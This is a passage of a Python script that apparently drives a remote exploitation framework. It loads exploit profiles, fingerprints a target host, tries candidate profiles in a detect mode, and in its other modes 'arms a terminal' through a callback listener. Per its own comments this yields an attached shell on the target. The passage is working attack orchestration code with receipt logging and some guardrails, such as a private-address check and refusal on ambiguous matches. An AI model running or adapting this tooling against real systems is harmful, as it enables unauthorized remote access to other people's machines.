        "profile_status": profile["status"],
        "capabilities": profile["capabilities"],
        "profile_scope": profile["scope"],
        "portability_status": profile["portability_status"],
        "implementation": profile["implementation"],
        "attempt": 1,
        "terminal_armed": False,
        "target_state_used": False,
        "target_process_identity_known": False,
        "a1_sha256": profile["requests"]["a1"]["sha256"],
        "b1_sha256": profile["requests"]["b1"]["sha256"],
    }
    remote.write_json(terminal_root / "receipt.json", terminal_receipt)
    try:
        result = try_profile(
            args.host, args.port, profile, terminal_root,
            args, listener, terminal_receipt, operation_mode=args.mode)
    except Exception as exc:
        armed = bool(terminal_receipt.get("terminal_armed"))
        terminal_receipt["status"] = (
            "TERMINAL_STAGE_FAILED" if armed else "PROFILE_VALIDATION_FAILED")
        terminal_receipt["error"] = f"{type(exc).__name__}: {exc}"
        remote.write_json(terminal_root / "receipt.json", terminal_receipt)
        receipt["selected_profile"] = profile["id"]
        receipt["selection_signature"] = profile["_selection_key"]
        receipt["terminal_armed"] = armed
        receipt["terminal_receipt"] = str(terminal_root / "receipt.json")
        receipt["candidate_attempts"].append({
            "profile_id": profile["id"],
            "attempt": 1,
            "status": terminal_receipt["status"],
            "error": terminal_receipt["error"],
            "receipt": str(terminal_root / "receipt.json"),
        })
        remote.write_json(receipt_path, receipt)
        raise
    finally:
        listener.close()

    result_receipt = result["receipt"]
    receipt["selected_profile"] = profile["id"]
    receipt["selection_signature"] = profile["_selection_key"]
    receipt["selected_receipt"] = str(terminal_root / "receipt.json")
    receipt["terminal_armed"] = bool(result_receipt.get("terminal_armed"))
    receipt["terminal_receipt"] = str(terminal_root / "receipt.json")
    receipt["candidate_attempts"].append({
        "profile_id": profile["id"],
        "attempt": 1,
        "status": result_receipt["status"],
        "receipt": str(terminal_root / "receipt.json"),
    })
    receipt["status"] = result_receipt["status"]
    remote.write_json(receipt_path, receipt)
    print(json.dumps({
        "receipt": str(receipt_path),
        "selected_profile": profile["id"],
        "status": result_receipt["status"],
        "selected_receipt": str(terminal_root / "receipt.json"),
        "terminal_receipt": str(terminal_root / "receipt.json"),
    }, indent=2))
    return 0


def main():
    args = parse_args()
    profiles = load_registry(args.profiles)
    if args.list_profiles:
        print(json.dumps([{key: profile.get(key) for key in (
            "id", "status", "capabilities", "scope", "portability_status", "priority",
            "description", "worker_count", "non_default_dependencies")}
            for profile in profiles], indent=2))
        return 0

    if args.profile_id:
        profiles = [profile for profile in profiles if profile["id"] == args.profile_id]
        require(profiles, f"unknown profile {args.profile_id}")
    active = profiles_for_mode(profiles, args.mode)
    require(active, "no profiles eligible for requested mode")
    remote.core.HOST_HEADER = args.host

    run_root = remote.output_root() / (
        f"auto-profile-{args.mode}-{int(time.time())}-{os.getpid()}")
    run_root.mkdir(mode=0o700, parents=True)
    receipt_path = run_root / "receipt.json"
    receipt = {
        "status": "STARTED",
        "mode": args.mode,
        "target": f"{args.host}:{args.port}",
        "callback": args.callback,
        "profile_schema": "q618-auto-profiles-v2",
        "registry": str(args.profiles.resolve()),
        "terminal_armed": False,
        "target_state_used": False,
        "target_process_identity_known": False,
        "candidate_attempts": [],
    }
    receipt["resolved_private_addresses"] = resolve_private_target(
        args.host, args.port)
    remote.write_json(receipt_path, receipt)

    fingerprints = fingerprint_target(args.host, args.port, active, run_root)
    receipt["fingerprints"] = fingerprints
    candidates = [profile for profile in active
                  if fingerprints[profile["id"]]["match"]]
    if not candidates and args.try_unfingerprinted:
        candidates = active
    require(candidates, "no fingerprint-compatible profile for requested mode")

    if args.mode != "detect":
        require(len(candidates) == 1,
                "multiple fingerprint-compatible READY profiles; terminal not armed; run detect mode or use --profile-id")
        return run_terminal_candidate(
            args, candidates[0], run_root, receipt, receipt_path)

    matches = []
    try:
        for profile in candidates:
            for attempt in range(1, args.attempts + 1):
                attempt_root = run_root / f"{profile['id']}-detect-{attempt}"
                attempt_root.mkdir(mode=0o700)
                attempt_receipt = {
                    "status": "CANDIDATE_STARTED",
                    "mode": "detect",
                    "profile_id": profile["id"],
                    "profile_status": profile["status"],
                    "capabilities": profile["capabilities"],
                    "profile_scope": profile["scope"],
                    "portability_status": profile["portability_status"],
                    "implementation": profile["implementation"],
                    "attempt": attempt,
                    "terminal_armed": False,
                    "target_state_used": False,
                    "target_process_identity_known": False,
                    "a1_sha256": profile["requests"]["a1"]["sha256"],
                    "b1_sha256": profile["requests"]["b1"]["sha256"],
                }
                remote.write_json(attempt_root / "receipt.json", attempt_receipt)
                try:
                    result = try_profile(
                        args.host, args.port, profile, attempt_root,
                        args, None, attempt_receipt, operation_mode="detect")
                    matches.append((profile, attempt_root, result["receipt"]))
                    receipt["candidate_attempts"].append({
                        "profile_id": profile["id"],
                        "attempt": attempt,
                        "status": result["receipt"]["status"],
                        "receipt": str(attempt_root / "receipt.json"),
                    })
                    break
                except (OSError, TimeoutError, SelectionStopped,
                        WorkerSelectionError, remote.core.ExploitStopped) as exc:
                    require(not attempt_receipt.get("terminal_armed"),
                            "terminal armed during detection")
                    attempt_receipt["status"] = "CANDIDATE_REJECTED"
                    attempt_receipt["error"] = f"{type(exc).__name__}: {exc}"
                    remote.write_json(attempt_root / "receipt.json", attempt_receipt)
                    receipt["candidate_attempts"].append({
                        "profile_id": profile["id"],
                        "attempt": attempt,
                        "status": "CANDIDATE_REJECTED",
                        "error": attempt_receipt["error"],
                        "receipt": str(attempt_root / "receipt.json"),
                    })
                    remote.write_json(receipt_path, receipt)
                    if attempt < args.attempts:
                        time.sleep(1.0)

        require(matches, "all READY profiles rejected before terminal")
        require(len(matches) == 1,
                "ambiguous active profile selection; terminal not armed")
        profile, selection_root, selection_receipt = matches[0]
        receipt["selected_profile"] = profile["id"]
        receipt["selection_signature"] = profile["_selection_key"]
        receipt["selected_receipt"] = str(selection_root / "receipt.json")
        receipt["status"] = selection_receipt["status"]
        remote.write_json(receipt_path, receipt)

        print(json.dumps({
            "receipt": str(receipt_path),
            "selected_profile": profile["id"],
            "status": selection_receipt["status"],
            "selected_receipt": str(selection_root / "receipt.json"),
        }, indent=2))
        return 0
    except Exception as exc:
        receipt["status"] = "STOPPED"
        receipt["error"] = f"{type(exc).__name__}: {exc}"
        remote.write_json(receipt_path, receipt)
        raise


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        # The operator may stop the attached shell after recording.  Keep that
        # local detach clean instead of printing a Python traceback.
        raise SystemExit(130)
    except (OSError, TimeoutError, ValueError, KeyError, json.JSONDecodeError,
            SelectionStopped, WorkerSelectionError,
            remote.core.ExploitStopped) as exc:
        print(f"stopped: {exc}", file=__import__("sys").stderr)
        raise SystemExit(1)
